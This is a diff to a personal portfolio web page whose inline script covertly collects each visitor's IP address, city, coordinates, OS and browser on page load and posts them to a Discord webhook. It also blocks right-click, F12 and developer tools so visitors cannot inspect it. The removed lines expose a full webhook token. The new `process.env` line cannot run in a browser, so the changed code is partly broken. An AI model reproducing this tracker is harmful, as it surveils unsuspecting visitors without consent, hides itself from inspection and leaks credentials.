@@ -8,10 +8,10 @@
     <title>VIKASH</title>
 
     <!-- Google fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Open+Sans&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700%7COpen+Sans&display=swap" />
 
     <!-- Libraries -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 
     <!-- Custom styling -->
     <link rel="stylesheet" href="./assets/css/util.css">
@@ -27,8 +27,6 @@
             font-weight: 700;
             cursor: pointer;
             outline: none;
-            text-decoration: none;
-            display: inline-block;
         }
 
         .btn-contact:hover {
@@ -72,12 +70,12 @@
     <div class="wrapper" style="display: none;" id="mainContent">
         <!-- Header -->
         <header>
-            <img class="logo" src="./assets/img/logo.png" alt="VIKASH">
+            <img class="logo" src="./assets/img/logo.png" width="100" alt="VIKASH" />
             <nav>
                 <ul>
                     <li><a href="#">Home</a></li>
                     <li><a href="./assets/About/index.html">About</a></li>
-                    <li><a href="./assets/Projects/index.html">Projects</a></li>
+                    <li><a href="projects">Projects</a></li>
                 </ul>
             </nav>
             <a class="btn-contact" href="./assets/Contact form/index.html">
@@ -93,27 +91,31 @@
                 <p>Where innovation meets the web <a href="https://internet.org" target="_blank">Internet</a>,
                     "Connecting you to the digital world. Crafting online experiences that captivate. Innovating the
                     web, one click at a time."</p>
-                <a class="btn btn-outline" href="https://github.com/Vikash888" target="_blank">
-                    <i class="fa-brands fa-github"></i> GitHub
+                <a class="btn btn-outline" href="https://github.com/Vikash888" target="_blank"> <i
+                        class="fa-brands fa-github"></i> GitHub 
                 </a>
                 <div class="social-links">
                     <ul>
-                        <li><a href="https://www.facebook.com/profile.php?id=100013994083962&mibextid=ZbWKwL" target="_blank" class="btn-social bg-facebook">
-                            <i class="fa-brands fa-facebook-f"></i>
-                        </a></li>
-                        <li><a href="https://youtube.com/@vikash.j3497" target="_blank" class="btn-social bg-youtube">
-                            <i class="fa-brands fa-youtube"></i>
-                        </a></li>
-                        <li><a href="https://www.instagram.com/crazy_v_i_c_k_y__?igsh=MXZzaGI5dXZ2ZDJzbg==" target="_blank" class="btn-social bg-instagram">
-                            <i class="fa-brands fa-instagram"></i>
-                        </a></li>
-                        <li><a href="http://www.linkedin.com/in/vikash-j-5b5056228" target="_blank" class="btn-social bg-linkedin">
-                            <i class="fa-brands fa-linkedin"></i>
-                        </a></li>
+                        <li><a href="https://www.facebook.com/profile.php?id=100013994083962&mibextid=ZbWKwL"
+                                target="_blank" class="btn-social bg-facebook">
+                                <i class="fa-brands fa-facebook-f"></i>
+                            </a></li>
+                        <li><a href="https://youtube.com/@vikash.j3497" target="_blank"
+                                class="btn-social bg-youtube">
+                                <i class="fa-brands fa-youtube"></i>
+                            </a></li>
+                        <li><a href="https://www.instagram.com/crazy_v_i_c_k_y__?igsh=MXZzaGI5dXZ2ZDJzbg=="
+                                target="_blank" class="btn-social bg-instagram">
+                                <i class="fa-brands fa-instagram"></i>
+                            </a></li>
+                        <li><a href="http://www.linkedin.com/in/vikash-j-5b5056228" target="_blank"
+                                class="btn-social bg-linkedin">
+                                <i class="fa-brands fa-linkedin"></i>
+                            </a></li>
                     </ul>
                 </div>
             </div>
-            <img src="assets/img/WEB.png" alt="WEB">
+            <img src="assets/img/WEB.png" alt="WEB.png">
         </div>
         <!-- End Main Content -->
 
@@ -126,9 +128,8 @@
     </div>
 
     <script>
-        // Discord webhook URL
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1262504162751680582/6BqMbWkomK8CpKQl2HaHVDWS-cAFEJtmGDbjsiBvBSNk14boIbZbXGm-Px7sDzUdU0I2';
-
+        // Discord webhook URL placeholder
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';
         document.addEventListener('DOMContentLoaded', function () {
             setTimeout(function () {
                 document.getElementById('loadingScreen').style.display = 'none';
@@ -136,7 +137,7 @@
             }, 1000);
         });
 
-        async function getClientIp() {
+        async function getClientip() {
             try {
                 let response = await fetch('https://api.ipify.org?format=json');
                 let data = await response.json();
@@ -151,11 +152,12 @@
             try {
                 let response = await fetch(`https://ipinfo.io/${ip}/json`);
                 let data = await response.json();
+                console.log('Location data:', data);
                 return {
-                    country: data.country || 'Unknown country',
-                    city: data.city || 'Unknown city',
-                    latitude: data.loc ? data.loc.split(',')[0] : 'Unknown latitude',
-                    longitude: data.loc ? data.loc.split(',')[1] : 'Unknown longitude'
+                    country: data.country,
+                    city: data.city,
+                    latitude: data.loc.split(',')[0],
+                    longitude: data.loc.split(',')[1]
                 };
             } catch (error) {
                 console.error('Error fetching location data:', error);
@@ -195,7 +197,7 @@
             return browser;
         }
 
-        async function sendToDiscord(ip, location, os, browser) {
+    async function sendToDiscord(ip, location, os, browser) {
             const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
             const message = {
                 content: `
@@ -214,7 +216,6 @@ Browser: ${browser}
                 body: JSON.stringify(message)
             });
         }
-
         function isVisitorCounted() {
             let visited = document.cookie.includes('visited=true');
             if (!visited) {
@@ -239,25 +240,29 @@ Browser: ${browser}
             }
         }
 
-        async function init() {
-            let visitorCount = updateVisitorCount();
-            document.getElementById('visitorCount').textContent = visitorCount;
+        let visitorCount = updateVisitorCount();
+        document.getElementById('visitorCount').textContent = visitorCount;
 
-            let ip = await getClientIp();
+        getClientip().then(ip => {
             document.getElementById('Clientip').textContent = ip;
 
-            let location = await getVisitorLocation(ip);
-            await sendToDiscord(ip, location, getVisitorOS(), getVisitorBrowser());
-        }
-
-        init();
+            getVisitorLocation(ip).then(location => {
+                sendToDiscord(ip, location, getVisitorOS(), getVisitorBrowser());
+            });
+        });
 
         window.addEventListener('contextmenu', function (e) {
             e.preventDefault();
         });
 
         window.addEventListener('keydown', function (e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        window.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                 e.preventDefault();
             }
         });
@@ -268,6 +273,7 @@ Browser: ${browser}
             let endTime = performance.now();
 
             if (endTime - startTime > 1) {
+                alert('Developer tools detected! Please close them to continue.');
                 window.location.href = 'about:blank';
             }
         }
